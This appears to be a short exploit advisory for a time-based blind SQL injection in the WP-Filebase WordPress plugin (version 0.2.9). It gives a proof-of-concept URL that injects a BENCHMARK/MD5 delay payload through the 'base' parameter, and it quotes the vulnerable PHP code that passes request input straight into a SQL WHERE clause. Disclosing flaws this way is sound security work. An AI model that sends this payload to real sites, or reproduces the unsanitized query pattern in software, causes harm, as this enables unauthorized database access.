# Date: 2011-09-09
# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
# Version: 0.2.9 (tested)
 
---
PoC
---
http://www.site.com/wp-content/plugins/wp-filebase/wpfb-ajax.php?action=tree&base=-1 AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)--%20&root=source
 
---------------
Vulnerable code
---------------
if(!isset($_REQUEST[&#039;action&#039;]))
    die(&#039;-1&#039;);
...
switch ( $action = $_REQUEST[&#039;action&#039;] ) {
    case &#039;tree&#039;:
        ...
        $base_id = (empty($_REQUEST[&#039;base&#039;]) ? 0 : $_REQUEST[&#039;base&#039;]);
        ...
        if(empty($_REQUEST[&#039;root&#039;]) || $_REQUEST[&#039;root&#039;] == &#039;source&#039;)
            $parent_id = $base_id;
        else {
            $root = $_REQUEST[&#039;root&#039;];
            $parent_id = is_numeric($root) ? intval($root) : intval(substr(strrchr($root,&#039;-&#039;),1));
        }
        ...
        $cats = $browser ? WPFB_Category::GetFileBrowserCats($parent_id) : WPFB_Category::GetCats("WHERE cat_parent = $parent_id ORDER BY cat_name ASC");



